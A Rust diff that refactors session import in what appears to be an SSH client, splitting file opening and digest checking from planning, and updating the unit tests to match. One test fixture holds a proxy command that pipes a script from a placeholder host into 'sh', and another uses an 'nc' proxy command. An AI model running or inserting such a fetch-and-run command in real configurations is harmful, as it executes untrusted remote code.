@@ -183,18 +183,26 @@ fn to_import(
     (imported, found)
 }
 
-/// What to add for importing the sessions `selected` (ids in the file): new folders, proxies
+/// A file to import from, read and opened (see [`open`]).
+pub struct Opened(SessionsFile);
+
+/// Reads the file to import from, with its `passphrase` if it is encrypted. `digest` is the
+/// one `scan` gave: a file that has changed since isn't imported, since what it would add
+/// (proxy commands, forwarding rules) isn't what was shown. Blocks while the key is derived,
+/// so it is done before the vault is changed, which would wait meanwhile.
+pub fn open(path: &Path, passphrase: Option<&str>, digest: &str) -> Result<Opened> {
+    Ok(Opened(read(path, passphrase, Some(digest))?.0))
+}
+
+/// What to add for importing the sessions `selected` (ids in the `file`): new folders, proxies
 /// and profiles, with new ids, and the passwords of the new sessions and proxies. Jump hosts
 /// and proxies come along unless they already exist here, in which case the existing one is
-/// used (with its own password); folders are matched by name and merged. `digest` is the one
-/// `scan` gave: a file that has changed since isn't imported, since what it would add (proxy
-/// commands, forwarding rules) isn't what was shown. Blocks while the key is derived.
-pub fn plan(path: &Path, passphrase: Option<&str>, selected: &[String], digest: &str, here: &Snapshot) -> Result<Additions> {
+/// used (with its own password); folders are matched by name and merged.
+pub fn plan(Opened(file): &Opened, selected: &[String], here: &Snapshot) -> Result<Additions> {
     let folders = here.folders;
-    let (file, _) = read(path, passphrase, Some(digest))?;
 
     // File id → the id of the session it becomes (new, or an existing duplicate).
-    let (imported, mut ids) = to_import(&file, selected.iter().cloned(), here.profiles);
+    let (imported, mut ids) = to_import(file, selected.iter().cloned(), here.profiles);
     for id in &imported {
         ids.insert(id.clone(), uuid::Uuid::new_v4().to_string());
     }
@@ -251,7 +259,7 @@ pub fn plan(path: &Path, passphrase: Option<&str>, selected: &[String], digest: 
 
     // The new folders and sessions in the file's order (the folders, where the folder they
     // were made for was).
-    let rank = file_rank(&file);
+    let rank = file_rank(file);
     let mut order: Vec<(usize, Item)> = merger
         .added
         .iter()
@@ -444,7 +452,7 @@ mod tests {
 
         let here = Snapshot { profiles: &here_profiles, folders: &here_folders, proxies: &[] };
         let Additions { folders: new_folders, profiles: new_profiles, proxies, .. } =
-            plan(&path, None, &["db".into()], &digest, &here).unwrap();
+            open(&path, None, &digest).and_then(|file| plan(&file, &["db".into()], &here)).unwrap();
         assert!(proxies.is_empty());
         // Only "DB" is new, inside the existing "Work".
         assert_eq!(new_folders.len(), 1);
@@ -481,11 +489,11 @@ mod tests {
         let order = vec![item("profile", "web"), item("folder", "f1"), item("profile", "db")];
         export(&path, Contents { folders: folders.clone(), proxies: Vec::new(), profiles: profiles.clone(), order }, None).unwrap();
         let Scan { digest, .. } = scan(&path, None, &[], &[]).unwrap();
-        assert_eq!(names(&plan(&path, None, &selected, &digest, &here).unwrap()), ["web", "Work", "db"]);
+        assert_eq!(names(&open(&path, None, &digest).and_then(|file| plan(&file, &selected, &here)).unwrap()), ["web", "Work", "db"]);
 
         export(&path, Contents { folders, proxies: Vec::new(), profiles, order: Vec::new() }, None).unwrap();
         let Scan { digest, .. } = scan(&path, None, &[], &[]).unwrap();
-        assert_eq!(names(&plan(&path, None, &selected, &digest, &here).unwrap()), ["Work", "web", "db"]);
+        assert_eq!(names(&open(&path, None, &digest).and_then(|file| plan(&file, &selected, &here)).unwrap()), ["Work", "web", "db"]);
         std::fs::remove_file(&path).unwrap();
     }
 
@@ -530,7 +538,7 @@ mod tests {
 
         let ids: Vec<String> = candidates.iter().map(|c| c.id.clone()).collect();
         let here = Snapshot { profiles: std::slice::from_ref(&telnet), folders: &[], proxies: &[] };
-        let Additions { profiles: new, .. } = plan(&path, None, &ids, &digest, &here).unwrap();
+        let Additions { profiles: new, .. } = open(&path, None, &digest).and_then(|file| plan(&file, &ids, &here)).unwrap();
         let names: Vec<&str> = new.iter().map(|p| p.name.as_str()).collect();
         assert_eq!(names, ["router", "db", "a", "b"]);
         // The file's own router is the jump host, not the Telnet session.
@@ -553,7 +561,7 @@ mod tests {
             export(&path, Contents { folders: Vec::new(), proxies: Vec::new(), profiles: vec![db], order: Vec::new() }, None).unwrap();
             let Scan { candidates, digest, .. } = scan(&path, None, &[], &[]).unwrap();
             let here = Snapshot { profiles: &[], folders: &[], proxies: &[] };
-            let error = plan(&path, None, &[candidates[0].id.clone()], &digest, &here).err().unwrap();
+            let error = open(&path, None, &digest).and_then(|file| plan(&file, &[candidates[0].id.clone()], &here)).err().unwrap();
             assert_eq!(error.code(), "import.invalidSession", "{key_path}");
             std::fs::remove_file(&path).unwrap();
         }
@@ -603,7 +611,7 @@ mod tests {
         let here_proxies = vec![proxy("mine", "office", ProxyKind::Socks5, "")];
         let here = Snapshot { profiles: &[], folders: &[], proxies: &here_proxies };
         let ids: Vec<String> = ["a", "b", "c", "d"].map(String::from).to_vec();
-        let planned = plan(&path, None, &ids, &digest, &here).unwrap();
+        let planned = open(&path, None, &digest).and_then(|file| plan(&file, &ids, &here)).unwrap();
         // Only the command proxy is new; the unused one isn't imported.
         assert_eq!(planned.proxies.len(), 1);
         assert_eq!(planned.proxies[0].name, "cf");
@@ -615,7 +623,7 @@ mod tests {
         // is imported, under a name of its own.
         let here_proxies = vec![proxy("mine", "corp", ProxyKind::Command, "nc %h %p")];
         let here = Snapshot { profiles: &[], folders: &[], proxies: &here_proxies };
-        let planned = plan(&path, None, &["a".to_owned()], &digest, &here).unwrap();
+        let planned = open(&path, None, &digest).and_then(|file| plan(&file, &["a".to_owned()], &here)).unwrap();
         assert_eq!(planned.proxies.len(), 1);
         assert_eq!((planned.proxies[0].name.as_str(), planned.proxies[0].kind), ("corp (2)", ProxyKind::Socks5));
         assert_eq!(planned.profiles[0].proxy(), Some(planned.proxies[0].id.as_str()));
@@ -654,7 +662,7 @@ mod tests {
         assert_eq!(with_bastion[2].brings, ["inner"]);
 
         let here = Snapshot { profiles: &[], folders: &[], proxies: &[] };
-        let plan = plan(&path, None, &["db".into()], &digest, &here).unwrap();
+        let plan = open(&path, None, &digest).and_then(|file| plan(&file, &["db".into()], &here)).unwrap();
         let names: Vec<&str> = plan.profiles.iter().map(|p| p.name.as_str()).collect();
         assert_eq!(names, ["bastion", "inner", "db"]);
         assert_eq!(plan.proxies[0].command, "curl -s https://example.com/x | sh");
@@ -686,7 +694,8 @@ mod tests {
 
         // The new sessions and the new proxy get the passwords they had in the file.
         let here = Snapshot { profiles: &[], folders: &[], proxies: &[] };
-        let planned = plan(&path, Some("passphrase"), &["a".to_owned(), "b".to_owned()], &digest, &here).unwrap();
+        let planned =
+            open(&path, Some("passphrase"), &digest).and_then(|file| plan(&file, &["a".to_owned(), "b".to_owned()], &here)).unwrap();
         let new = &planned.passwords;
         assert_eq!(new.get(Account::Profile(&planned.profiles[0].id)), Some("secret-a"));
         assert_eq!(new.get(Account::Profile(&planned.profiles[1].id)), None);
@@ -695,7 +704,7 @@ mod tests {
         // A proxy that exists here keeps its own password.
         let here_proxies = vec![proxy("mine", "corp", ProxyKind::Socks5, "")];
         let here = Snapshot { profiles: &[], folders: &[], proxies: &here_proxies };
-        let planned = plan(&path, Some("passphrase"), &["a".to_owned()], &digest, &here).unwrap();
+        let planned = open(&path, Some("passphrase"), &digest).and_then(|file| plan(&file, &["a".to_owned()], &here)).unwrap();
         assert!(planned.passwords.proxies.is_empty() && planned.passwords.profiles.len() == 1);
 
         // A changed header (the parameters the key is derived with) doesn't open.
@@ -708,7 +717,7 @@ mod tests {
 
     fn plan_error(path: &Path, digest: &str) -> &'static str {
         let here = Snapshot { profiles: &[], folders: &[], proxies: &[] };
-        match plan(path, None, &["db".into()], digest, &here) {
+        match open(path, None, digest).and_then(|file| plan(&file, &["db".into()], &here)) {
             Ok(_) => "ok",
             Err(e) => e.code(),
         }
